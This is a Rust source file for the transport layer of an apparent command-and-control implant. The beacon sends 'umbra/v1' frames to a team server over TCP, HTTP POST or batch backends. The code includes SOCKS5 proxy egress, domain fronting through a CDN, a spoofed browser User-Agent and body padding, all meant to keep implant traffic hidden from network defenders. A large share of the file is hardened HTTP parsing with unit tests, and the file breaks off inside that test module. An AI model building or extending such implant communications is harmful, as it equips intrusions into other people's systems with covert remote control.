//! Transports. Every transport carries whole umbra/v1 frames; the session and
//! message handling above this layer is identical for all of them.
//!
//! * `TcpChannel`  -- one connection per beacon cycle, frames in both directions.
//! * `HttpChannel` -- frames inside HTTP POST bodies (plain HTTP/1.1 written by
//!   hand, so no TLS/async runtime dependency; put it behind a TLS-terminating
//!   reverse proxy or an HTTPS redirector for production).

use std::io::{self, Read, Write};
use std::net::ToSocketAddrs;
use std::time::Duration;

/// The socket type the channels use. It is re-exported so the pivot code can
/// hand a connected socket over to another component.
pub use std::net::TcpStream;

pub trait Channel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()>;
    fn read_frame(&mut self) -> io::Result<Vec<u8>>;
    fn close(&mut self);
    /// Push any buffered frames to the server (no-op for stream transports).
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
    /// HTTP transports record the session id here so later requests can be
    /// routed to the same server-side session.
    fn set_session_id(&mut self, _sid: &str) {}
    /// The number of bytes that wait for the next request. The HTTP
    /// transport uses it to pad a body to a bucket size.
    fn pending_len(&self) -> usize {
        0
    }
    /// Take the underlying socket, when the transport owns one. The pivot
    /// callback uses it to keep the connection after the handshake.
    fn take_stream(&mut self) -> Option<TcpStream> {
        None
    }
}

const CONNECT_TIMEOUT: Duration = Duration::from_secs(15);
const IO_TIMEOUT: Duration = Duration::from_secs(60);

/// The most header this parser will hold while looking for the blank line.
///
/// The check used to run after a 4 KiB read had already been appended, so the
/// buffer could reach 68 288 bytes before the error, and the bound the code
/// claimed was not the bound it enforced.
const MAX_HEADER_BYTES: usize = 64 * 1024;

/// The most body this parser will hold.
///
/// A response with no length and no chunked framing was read until the peer
/// closed, into a `Vec` with no ceiling: the peer chose how much memory this
/// process gave it.  64 MiB is far above one beacon cycle (a frame is capped
/// at 1 MiB by `wire::MAX_FRAME`, and a cycle carries tens of frames), and far
/// below "however much the other end wants".
const MAX_BODY_BYTES: usize = 64 * 1024 * 1024;

// ---------------------------------------------------------------------------
// TCP
// ---------------------------------------------------------------------------

pub struct TcpChannel {
    addr: String,
    proxy: String,
    stream: Option<TcpStream>,
}

impl TcpChannel {
    pub fn new(addr: &str) -> Self {
        TcpChannel { addr: addr.to_string(), proxy: String::new(), stream: None }
    }

    /// Route the connection through a SOCKS5 proxy.
    ///
    /// A beacon in a network that only lets a proxy out uses this: the
    /// implant speaks to the proxy, and the proxy carries the traffic to
    /// the team server.
    pub fn with_proxy(mut self, proxy: &str) -> Self {
        self.proxy = proxy.trim().to_string();
        self
    }

    pub fn connect(&mut self) -> io::Result<()> {
        if !self.proxy.is_empty() {
            return self.connect_via_proxy();
        }
        let mut last: Option<io::Error> = None;
        for sa in self.addr.to_socket_addrs()? {
            match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
                Ok(s) => {
                    s.set_read_timeout(Some(IO_TIMEOUT))?;
                    s.set_write_timeout(Some(IO_TIMEOUT))?;
                    s.set_nodelay(true)?;
                    self.stream = Some(s);
                    return Ok(());
                }
                Err(e) => last = Some(e),
            }
        }
        Err(last.unwrap_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address")))
    }

    /// Connect to the proxy and let it carry the traffic to the server.
    fn connect_via_proxy(&mut self) -> io::Result<()> {
        let mut last: Option<io::Error> = None;
        for sa in self.proxy.to_socket_addrs()? {
            match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
                Ok(mut s) => {
                    s.set_read_timeout(Some(IO_TIMEOUT))?;
                    s.set_write_timeout(Some(IO_TIMEOUT))?;
                    s.set_nodelay(true)?;
                    if let Err(e) = socks5_connect(&mut s, &self.addr) {
                        last = Some(e);
                        continue;
                    }
                    self.stream = Some(s);
                    return Ok(());
                }
                Err(e) => last = Some(e),
            }
        }
        Err(last.unwrap_or_else(|| {
            io::Error::new(io::ErrorKind::AddrNotAvailable, "the proxy is unreachable")
        }))
    }
}

/// The SOCKS5 handshake: no authentication, then a CONNECT to the target.
fn socks5_connect(stream: &mut TcpStream, target: &str) -> io::Result<()> {
    // The greeting: version 5, one method, "no authentication".
    stream.write_all(&[0x05, 0x01, 0x00])?;
    stream.flush()?;
    let mut reply = [0u8; 2];
    stream.read_exact(&mut reply)?;
    if reply[0] != 0x05 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "the proxy does not speak SOCKS5",
        ));
    }
    if reply[1] != 0x00 {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "the proxy wants an authentication the implant does not have",
        ));
    }
    // The request: CONNECT to the address of the team server.
    let (host, port) = split_target(target);
    let mut request: Vec<u8> = vec![0x05, 0x01, 0x00];
    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
        request.push(0x01);
        request.extend_from_slice(&ip.octets());
    } else if let Ok(ip) = host.parse::<std::net::Ipv6Addr>() {
        request.push(0x04);
        request.extend_from_slice(&ip.octets());
    } else {
        if host.len() > 255 {
            return Err(io::Error::new(io::ErrorKind::InvalidInput, "the host is too long"));
        }
        request.push(0x03);
        request.push(host.len() as u8);
        request.extend_from_slice(host.as_bytes());
    }
    request.extend_from_slice(&port.to_be_bytes());
    stream.write_all(&request)?;
    stream.flush()?;

    // The reply: the version, the status and the bound address.
    let mut head = [0u8; 4];
    stream.read_exact(&mut head)?;
    if head[1] != 0x00 {
        return Err(io::Error::new(
            io::ErrorKind::ConnectionRefused,
            format!("the proxy refused the connection ({})", head[1]),
        ));
    }
    let rest = match head[3] {
        0x01 => 4 + 2,
        0x04 => 16 + 2,
        0x03 => {
            let mut len = [0u8; 1];
            stream.read_exact(&mut len)?;
            len[0] as usize + 2
        }
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "the proxy sent a bad address",
            ))
        }
    };
    let mut tail = vec![0u8; rest];
    stream.read_exact(&mut tail)?;
    Ok(())
}

/// Split "host:port" into the host and the port.
fn split_target(target: &str) -> (String, u16) {
    match target.rsplit_once(':') {
        Some((host, port)) => (
            host.trim_matches(|c| c == '[' || c == ']').to_string(),
            port.parse().unwrap_or(443),
        ),
        None => (target.to_string(), 443),
    }
}

impl Channel for TcpChannel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()> {
        let s = self
            .stream
            .as_mut()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotConnected, "tcp not connected"))?;
        s.write_all(frame)?;
        s.flush()
    }

    fn read_frame(&mut self) -> io::Result<Vec<u8>> {
        let s = self
            .stream
            .as_mut()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotConnected, "tcp not connected"))?;
        crate::wire::read_frame(s)
    }

    fn flush(&mut self) -> io::Result<()> {
        match self.stream.as_mut() {
            Some(s) => s.flush(),
            None => Ok(()),
        }
    }

    fn close(&mut self) {
        if let Some(s) = self.stream.take() {
            let _ = s.shutdown(std::net::Shutdown::Both);
        }
    }
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

pub struct HttpChannel {
    host: String,
    port: u16,
    path: String,
    /// The Host header of the requests. It is empty for "host:port", and a
    /// value for domain fronting: the beacon talks to a CDN while the
    /// request still names the origin.
    host_header: String,
    sid: Option<String>,
    out: Vec<u8>,
    pending: std::collections::VecDeque<Vec<u8>>,
    /// Kept across the POSTs of one beacon cycle (handshake, CHECKIN,
    /// results+BYE), so a cycle costs one TCP connect instead of three. The
    /// channel is dropped when the cycle ends, so no idle socket outlives it.
    stream: Option<TcpStream>,
}

impl HttpChannel {
    /// `addr` is "host:port"; `path` defaults to /api/v1/beacon.
    /// `host_header` overrides the Host header (domain fronting); an empty
    /// value means "host:port".
    pub fn new(addr: &str, path: &str, host_header: &str) -> io::Result<Self> {
        let (host, port) = match addr.rsplit_once(':') {
            Some((h, p)) => (
                h.to_string(),
                p.parse::<u16>()
                    .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "bad port"))?,
            ),
            None => return Err(io::Error::new(io::ErrorKind::InvalidInput, "addr must be host:port")),
        };
        Ok(HttpChannel {
            host,
            port,
            path: if path.is_empty() { "/api/v1/beacon".to_string() } else { path.to_string() },
            host_header: host_header.to_string(),
            sid: None,
            out: Vec::new(),
            pending: std::collections::VecDeque::new(),
            stream: None,
        })
    }

    fn connect(&self) -> io::Result<TcpStream> {
        let mut stream = TcpStream::connect_timeout(
            &(self.host.as_str(), self.port)
                .to_socket_addrs()?
                .next()
                .ok_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address"))?,
            CONNECT_TIMEOUT,
        )?;
        stream.set_read_timeout(Some(IO_TIMEOUT))?;
        stream.set_write_timeout(Some(IO_TIMEOUT))?;
        Ok(stream)
    }

    fn target(&self) -> String {
        match &self.sid {
            Some(sid) => format!("{}/{}", self.path, sid),
            None => self.path.clone(),
        }
    }

    fn post(&mut self, allow_empty: bool) -> io::Result<()> {
        let body = std::mem::take(&mut self.out);
        let target = self.target();
        if self.stream.is_none() {
            self.stream = Some(self.connect()?);
        }

        // A reused socket can already be closed by the server (idle timeout,
        // restart), which shows up as a failed write or a premature EOF. Drop
        // it and try once on a fresh connection. A retry may re-send the
        // frames of this POST; that is safe here because every agent-to-server
        // frame is idempotent (RESULT is keyed by task id, CHECKIN and BYE
        // carry no state).
        let mut attempt = 0;
        let (status, payload) = loop {
            let mut stream = self.stream.take().expect("stream checked above");
            let result = exchange(
                &mut stream,
                &target,
                &self.host,
                &self.host_header,
                self.port,
                &body,
            );
            match result {
                Ok((status, payload, reusable)) => {
                    if reusable {
                        self.stream = Some(stream);
                    }
                    break (status, payload);
                }
                Err(e) if attempt == 0 && is_stale_connection(&e) => {
                    attempt += 1;
                    self.stream = Some(self.connect()?);
                }
                Err(e) => return Err(e),
            }
        };

        if status != 200 {
            return Err(io::Error::new(
                io::ErrorKind::ConnectionAborted,
                format!("http status {status}"),
            ));
        }
        let frames = crate::wire::split_frames(&payload)?;
        if frames.is_empty() && !allow_empty {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "empty response body"));
        }
        for f in frames {
            self.pending.push_back(f);
        }
        Ok(())
    }
}

impl Channel for HttpChannel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()> {
        self.out.extend_from_slice(frame);
        Ok(())
    }

    fn read_frame(&mut self) -> io::Result<Vec<u8>> {
        if self.pending.is_empty() {
            if self.out.is_empty() {
                // Nothing to send and nothing buffered: the server never
                // answers an empty POST, so fail instead of stalling.
                return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "no frames to exchange"));
            }
            self.post(false)?;
        }
        self.pending
            .pop_front()
            .ok_or_else(|| io::Error::new(io::ErrorKind::UnexpectedEof, "no frames pending"))
    }

    fn flush(&mut self) -> io::Result<()> {
        if self.out.is_empty() {
            return Ok(());
        }
        self.post(true)
    }

    fn close(&mut self) {
        self.out.clear();
        self.pending.clear();
        self.stream = None;
    }

    fn set_session_id(&mut self, sid: &str) {
        self.sid = Some(sid.to_string());
    }

    fn pending_len(&self) -> usize {
        self.out.len()
    }
}

/// A transport that has no connection to keep.
///
/// The mail transport and the object transport post a batch of frames and
/// the server answers with a batch of frames.  The backend is the part that
/// speaks the protocol; the channel above it is the same for every batch
/// transport.
pub trait BatchBackend: Send {
    /// Deliver the frames and return the frames of the answer.
    fn exchange(&mut self, frames: &[u8]) -> io::Result<Vec<u8>>;
}

/// A channel that carries a batch of frames in each direction.
///
/// The frames the beacon writes are collected until it reads: the read
/// delivers the batch to the server and takes the answer out of it.  The
/// server answers every batch, so the read always has something to give
/// back.
pub struct BatchChannel {
    backend: Box<dyn BatchBackend>,
    pending: Vec<u8>,
    inbox: std::collections::VecDeque<Vec<u8>>,
}

impl BatchChannel {
    /// Create a channel over a backend.
    pub fn new(backend: Box<dyn BatchBackend>) -> Self {
        BatchChannel {
            backend,
            pending: Vec::new(),
            inbox: std::collections::VecDeque::new(),
        }
    }

    /// Deliver the frames that wait and take the answer in.
    fn pump(&mut self) -> io::Result<()> {
        if self.pending.is_empty() {
            return Ok(());
        }
        let frames = std::mem::take(&mut self.pending);
        let answer = self.backend.exchange(&frames)?;
        for frame in crate::wire::split_frames(&answer)
            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e.to_string()))?
        {
            self.inbox.push_back(frame);
        }
        Ok(())
    }
}

impl Channel for BatchChannel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()> {
        self.pending.extend_from_slice(frame);
        Ok(())
    }

    fn read_frame(&mut self) -> io::Result<Vec<u8>> {
        if self.inbox.is_empty() {
            self.pump()?;
        }
        match self.inbox.pop_front() {
            Some(frame) => Ok(frame),
            None => Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                "the batch transport has no answer",
            )),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        self.pump()
    }

    fn close(&mut self) {
        let _ = self.pump();
        self.pending.clear();
        self.inbox.clear();
    }

    fn pending_len(&self) -> usize {
        self.pending.len()
    }
}

/// Send one request on an open connection and read its response.
///
/// Returns `(status, body, reusable)`; `reusable` is false when the server
/// ended the connection (chunked or close-delimited body, `Connection: close`),
/// in which case the socket must not be used again.
fn exchange(
    stream: &mut TcpStream,
    target: &str,
    host: &str,
    host_header: &str,
    port: u16,
    body: &[u8],
) -> io::Result<(u16, Vec<u8>, bool)> {
    // The Host header is either the configured one (domain fronting) or
    // "host:port".
    let host = if host_header.is_empty() {
        crate::config::host_port(host, port)
    } else {
        host_header.to_string()
    };
    let header = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Content-Type: application/octet-stream\r\nContent-Length: {}\r\n\
         Connection: keep-alive\r\n\r\n",
        target,
        host,
        body.len()
    );
    stream.write_all(header.as_bytes())?;
    stream.write_all(body)?;
    stream.flush()?;
    read_http_response(stream)
}

/// True for the errors a half-closed, reused connection produces.
fn is_stale_connection(e: &io::Error) -> bool {
    matches!(
        e.kind(),
        io::ErrorKind::BrokenPipe
            | io::ErrorKind::ConnectionReset
            | io::ErrorKind::ConnectionAborted
            | io::ErrorKind::NotConnected
            | io::ErrorKind::UnexpectedEof
            | io::ErrorKind::WouldBlock
    )
}

/// The error every body-size refusal shares, so a caller can recognise it.
fn body_too_large(extra: &str) -> io::Error {
    io::Error::new(
        io::ErrorKind::InvalidData,
        format!("the body is larger than {MAX_BODY_BYTES} bytes{extra}"),
    )
}

/// Append from `r` until it ends, refusing to hold more than `MAX_BODY_BYTES`.
///
/// The room is checked before the read, not after it, so the buffer never
/// holds a byte more than the cap -- not even for the instant it takes to
/// notice.  A body that fills the cap exactly is still a question: the peer
/// may have more behind it, and answering "the body ended" on a guess is the
/// silent truncation this stage exists to remove.  One byte is therefore read
/// past an exact fill, and either the peer is done (a zero-length read) or the
/// body was over the cap.
fn read_body_to_eof<R: Read>(r: &mut R, body: &mut Vec<u8>, chunk: &mut [u8]) -> io::Result<()> {
    loop {
        let room = MAX_BODY_BYTES - body.len();
        if room == 0 {
            let mut probe = [0u8; 1];
            if r.read(&mut probe)? == 0 {
                return Ok(());
            }
            return Err(body_too_large(" exactly"));
        }
        let want = room.min(chunk.len());
        let n = r.read(&mut chunk[..want])?;
        if n == 0 {
            return Ok(());
        }
        body.extend_from_slice(&chunk[..n]);
    }
}

/// Read one HTTP/1.1 response and return (status, body, reusable).
fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>, bool)> {
    let mut buf = Vec::with_capacity(8192);
    let mut chunk = [0u8; 4096];

    // Read until the end of the header block.
    let header_end;
    loop {
        if let Some(pos) = find_subslice(&buf, b"\r\n\r\n") {
            header_end = pos + 4;
            break;
        }
        // The room is checked before the read is appended, so the buffer never
        // holds more than the limit even for the moment it takes to notice.
        if buf.len() >= MAX_HEADER_BYTES {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "http headers too large"));
        }
        let room = MAX_HEADER_BYTES - buf.len();
        let want = room.min(chunk.len());
        let n = r.read(&mut chunk[..want])?;
        if n == 0 {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "no http headers"));
        }
        buf.extend_from_slice(&chunk[..n]);
    }

    let head = String::from_utf8_lossy(&buf[..header_end]).to_string();
    let mut lines = head.split("\r\n");
    let status_line = lines.next().unwrap_or("");
    // The first line has to say what it is.  Without this check any three
    // words with a number in the middle were a status line, so a peer that
    // was not speaking HTTP at all could be read as one that answered.
    if !status_line.starts_with("HTTP/1.") {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("not an http/1.x response: {status_line:?}"),
        ));
    }
    let status: u16 = status_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "bad status line"))?;

    let mut content_length: Option<usize> = None;
    let mut chunked = false;
    let mut close = false;
    for line in lines {
        let lower = line.to_ascii_lowercase();
        if let Some(v) = lower.strip_prefix("content-length:") {
            // Three ways this field can be wrong, and none of them may end as
            // "there was no length": that answer re-frames the body as
            // "everything until the peer closes", which is a different message.
            let value = v.trim();
            let parsed = value.parse::<usize>().map_err(|_| {
                io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("the content length is not a number this build can hold: {value:?}"),
                )
            })?;
            match content_length {
                // Two different lengths are two different messages, and which
                // one is meant cannot be recovered by guessing.
                Some(seen) if seen != parsed => {
                    return Err(io::Error::new(
                        io::ErrorKind::InvalidData,
                        format!("two content lengths disagree: {seen} and {parsed}"),
                    ))
                }
                Some(_) => {}
                None => content_length = Some(parsed),
            }
        }
        if lower.starts_with("transfer-encoding:") && lower.contains("chunked") {
            chunked = true;
        }
        if let Some(v) = lower.strip_prefix("connection:") {
            // A list, not a word: "keep-alive, close" is what a peer sends
            // when it is finishing, and comparing the whole value with
            // "close" missed it -- so the next request went to a socket the
            // peer had already decided to close.
            close = v.split(',').any(|token| token.trim() == "close");
        }
    }
    if chunked && content_length.is_some() {
        // RFC 7230 lets a reader prefer chunked and ignore the length.  That
        // is the desync pair: one parser frames by length, the other by
        // chunk, and the two disagree about where the message ends.  A
        // response this code wrote itself never has both.
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "the response carries both a content length and chunked framing",
        ));
    }

    let mut body = buf[header_end..].to_vec();
    if chunked {
        // Read to EOF, then de-chunk.  The de-chunked output cannot be larger
        // than the input, so the cap on the input caps both.
        read_body_to_eof(r, &mut body, &mut chunk)?;
        return Ok((status, dechunk(&body)?, false));
    }
    match content_length {
        Some(len) => {
            // The announced length is the peer's number; it is refused before
            // anything is read against it.
            if len > MAX_BODY_BYTES {
                return Err(body_too_large(&format!(" (it announces {len})")));
            }
            while body.len() < len {
                let n = r.read(&mut chunk)?;
                if n == 0 {
                    return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "short body"));
                }
                body.extend_from_slice(&chunk[..n]);
            }
            body.truncate(len);
            // A length-delimited body is exactly consumed, so the socket is
            // still positioned at the next response.
            return Ok((status, body, !close));
        }
        None => read_body_to_eof(r, &mut body, &mut chunk)?,
    }
    Ok((status, body, false))
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn dechunk(body: &[u8]) -> io::Result<Vec<u8>> {
    let mut out = Vec::with_capacity(body.len());
    let mut pos = 0usize;
    loop {
        // A chunk size line is mandatory until the terminating zero, so an
        // input that ends without one is a cut message -- it used to leave
        // this loop with `break` and hand back the part it had read.
        let line_end = match find_subslice(&body[pos..], b"\r\n") {
            Some(p) => pos + p,
            None => {
                return Err(io::Error::new(
                    io::ErrorKind::UnexpectedEof,
                    "a chunk size without a line end",
                ))
            }
        };
        let size_str = String::from_utf8_lossy(&body[pos..line_end]).to_string();
        let size_str = size_str.split(';').next().unwrap_or("").trim().to_string();
        let size = usize::from_str_radix(&size_str, 16)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "bad chunk size"))?;
        pos = line_end + 2;
        if size == 0 {
            break;
        }
        // `pos + size` with a size of usize::MAX panics in a debug build and
        // wraps in a release one, and both end in a slice that is out of
        // range.  A peer chooses this number.
        let end = match pos.checked_add(size) {
            Some(end) => end,
            None => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("a chunk of {size} overflows the buffer"),
                ))
            }
        };
        if end > body.len() {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "short chunk"));
        }
        out.extend_from_slice(&body[pos..end]);
        // The CRLF after the data is part of the framing.  A missing one used
        // to be skipped by a `break`, which reported a cut message as whole.
        let next = end.checked_add(2).ok_or_else(|| {
            io::Error::new(io::ErrorKind::InvalidData, "the chunk framing overflows")
        })?;
        if next > body.len() {
            return Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                "a chunk without its trailing CRLF",
            ));
        }
        if &body[end..next] != b"\r\n" {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "a chunk is not followed by CRLF",
            ));
        }
        pos = next;
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dechunk_roundtrip() {
        let raw = b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n";
        assert_eq!(dechunk(raw).unwrap(), b"Wikipedia");
    }

    fn parse(raw: &[u8]) -> (u16, Vec<u8>, bool) {
        read_http_response(&mut std::io::Cursor::new(raw.to_vec())).unwrap()
    }

    #[test]
    fn length_delimited_response_is_keep_alive() {
        // Exactly one response on the wire; the body must stop at
        // Content-Length and the socket must stay usable.
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc";
        let (status, body, reusable) = parse(raw);
        assert_eq!(status, 200);
        assert_eq!(body, b"abc");
        assert!(reusable);
    }

    #[test]
    fn connection_close_is_not_reusable() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        let (_, body, reusable) = parse(raw);
        assert!(body.is_empty());
        assert!(!reusable);
    }

    #[test]
    fn chunked_response_is_not_reusable() {
        let raw = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n0\r\n\r\n";
        let (_, body, reusable) = parse(raw);
        assert_eq!(body, b"abc");
        assert!(!reusable);
    }

    #[test]
    fn stale_connection_errors_are_retryable() {
        for kind in [
            io::ErrorKind::BrokenPipe,
            io::ErrorKind::ConnectionReset,
            io::ErrorKind::UnexpectedEof,
        ] {
            assert!(is_stale_connection(&io::Error::new(kind, "x")), "{kind:?}");
        }
        assert!(!is_stale_connection(&io::Error::new(
            io::ErrorKind::InvalidData,
            "x"
        )));
    }

    /// Parse and expect a refusal, with the kind and the message.
    fn refuse(raw: &[u8]) -> (io::ErrorKind, String) {
        match read_http_response(&mut std::io::Cursor::new(raw.to_vec())) {
            Err(e) => (e.kind(), e.to_string()),
            Ok((status, body, _)) => {
                panic!("accepted {} with a body of {} bytes", status, body.len())
            }
        }
    }

    #[test]
    fn a_response_that_ends_inside_its_headers_is_refused() {
        // No CRLFCRLF at all: a peer that closed after one line.
        let (kind, message) = refuse(b"HTTP/1.1 200 OK\r\nContent-Length: 0");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("no http headers"), "{message}");
    }

    #[test]
    fn an_empty_response_is_refused() {
        let (kind, message) = refuse(b"");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("no http headers"), "{message}");
    }

    #[test]
    fn a_body_shorter_than_its_length_is_refused() {
        // Ten bytes announced, three delivered, then the peer closes.
        let (kind, message) = refuse(b"HTTP/1.1 200 OK\r\nContent-Length: 10\r\n\r\nabc");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("short body"), "{message}");
    }

    #[test]
    fn a_header_block_over_the_limit_is_refused() {
        // The limit is 64 KiB of headers; a header value that alone is larger
        // must not be buffered to its end.
        let mut raw = b"HTTP/1.1 200 OK\r\nX-Filler: ".to_vec();
        raw.extend(std::iter::repeat(b'a').take(70 * 1024));
        raw.extend_from_slice(b"\r\n\r\n");
        let (kind, message) = refuse(&raw);
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("http headers too large"), "{message}");
    }

    #[test]
    fn a_header_name_with_a_high_byte_cannot_smuggle_a_length() {
        // A peer that writes 0x80 in front of the field name.  The bytes are
        // decoded lossily, so the field is not "content-length" and cannot
        // frame the body; the real header below it still can.
        let raw = b"HTTP/1.1 200 OK\r\n\x80content-length: 3\r\nContent-Length: 5\r\n\r\nabcde";
        let (status, body, reusable) = parse(raw);
        assert_eq!(status, 200);
        assert_eq!(body, b"abcde", "the field with the high byte framed the body");
        assert!(reusable);
    }

    #[test]
    fn two_identical_lengths_are_one_answer() {
        // The same value twice is not a disagreement; it is redundant.
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\nContent-Length: 3\r\n\r\nabc";
        let (_, body, reusable) = parse(raw);
        assert_eq!(body, b"abc");
        assert!(reusable);
    }

    #[test]
    fn a_length_that_is_not_a_number_is_refused() {
        // It used to become `None`, which means "read until the peer closes":
        // a body of one size silently re-framed as a body of another.
        let (kind, message) = refuse(b"HTTP/1.1 200 OK\r\nContent-Length: 12x\r\n\r\nabc");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("not a number"), "{message}");
    }

    #[test]
    fn a_length_that_does_not_fit_is_refused() {
        let (kind, message) =
            refuse(b"HTTP/1.1 200 OK\r\nContent-Length: 99999999999999999999999\r\n\r\n");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("not a number"), "{message}");
    }

    #[test]
    fn an_empty_length_is_refused() {
        let (kind, _) = refuse(b"HTTP/1.1 200 OK\r\nContent-Length:\r\n\r\n");
        assert_eq!(kind, io::ErrorKind::InvalidData);
    }

    #[test]
    fn two_lengths_that_disagree_are_refused() {
        let (kind, message) = refuse(
            b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\nContent-Length: 5\r\n\r\nabcde",
        );
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("disagree"), "{message}");
    }

    #[test]
    fn chunked_framing_next_to_a_length_is_refused() {
        let (kind, message) = refuse(
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n3\r\nabc\r\n0\r\n\r\n",
        );
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("both"), "{message}");
    }

    #[test]
    fn a_status_line_that_does_not_say_http_is_refused() {
        let (kind, message) = refuse(b"foo 200 bar\r\nContent-Length: 0\r\n\r\n");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("not an http"), "{message}");
    }

    #[test]
    fn a_version_this_parser_does_not_speak_is_refused() {
        let (kind, message) = refuse(b"HTTP/2 200\r\nContent-Length: 0\r\n\r\n");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("not an http"), "{message}");
    }

    #[test]
    fn a_status_line_without_a_number_is_refused() {
        let (kind, message) = refuse(b"HTTP/1.1 OK\r\nContent-Length: 0\r\n\r\n");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("bad status line"), "{message}");
    }

    #[test]
    fn a_close_token_in_a_list_is_seen() {
        // "keep-alive, close" means the peer is done after this response.
        let raw =
            b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: keep-alive, close\r\n\r\n";
        let (_, body, reusable) = parse(raw);
        assert!(body.is_empty());
        assert!(!reusable, "a socket the peer will close was reused");
    }

    #[test]
    fn a_keep_alive_token_is_reusable() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: keep-alive\r\n\r\nok";
        let (_, body, reusable) = parse(raw);
        assert_eq!(body, b"ok");
        assert!(reusable);
    }

    fn dechunk_err(raw: &[u8]) -> (io::ErrorKind, String) {
        match dechunk(raw) {
            Err(e) => (e.kind(), e.to_string()),
            Ok(out) => panic!("accepted a cut chunked body of {} bytes", out.len()),
        }
    }

    #[test]
    fn a_chunk_size_that_overflows_is_refused_and_not_a_panic() {
        // Sixteen hex digits is usize::MAX on a 64-bit build, and `pos + size`
        // on that value panicked in debug and wrapped in release.  The size is
        // chosen by the peer.
        let (kind, message) = dechunk_err(b"ffffffffffffffff\r\nabc");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("overflows"), "{message}");
    }

    #[test]
    fn a_chunk_longer_than_the_buffer_is_refused() {
        let (kind, message) = dechunk_err(b"10\r\nabc");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("short chunk"), "{message}");
    }

    #[test]
    fn a_chunk_without_its_trailing_crlf_is_refused() {
        // The data is all there and the framing is not: this used to be
        // returned as a complete body.
        let (kind, message) = dechunk_err(b"3\r\nabc");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("CRLF"), "{message}");
    }

    #[test]
    fn a_chunk_followed_by_the_wrong_bytes_is_refused() {
        let (kind, message) = dechunk_err(b"3\r\nabcXX");
        assert_eq!(kind, io::ErrorKind::InvalidData);
        assert!(message.contains("CRLF"), "{message}");
    }

    #[test]
    fn a_chunked_body_without_its_terminator_is_refused() {
        // One complete chunk and then nothing.  The message is not over -- the
        // terminating zero chunk never arrived -- so this is a cut message,
        // not a body of "abc".  It used to be reported as exactly that, as a
        // successful `Ok(b"abc")`, which is the failure this test pins: the
        // old code does not merely return a different error, it returns no
        // error at all.
        let (kind, message) = dechunk_err(b"3\r\nabc\r\n");
        assert_eq!(kind, io::ErrorKind::UnexpectedEof);
        assert!(message.contains("chunk size"), "{message}");
    }

    #[test]
    fn an_empty_chunked_body_is_refused() {
        let (kind, _) = dechunk_err(b"");
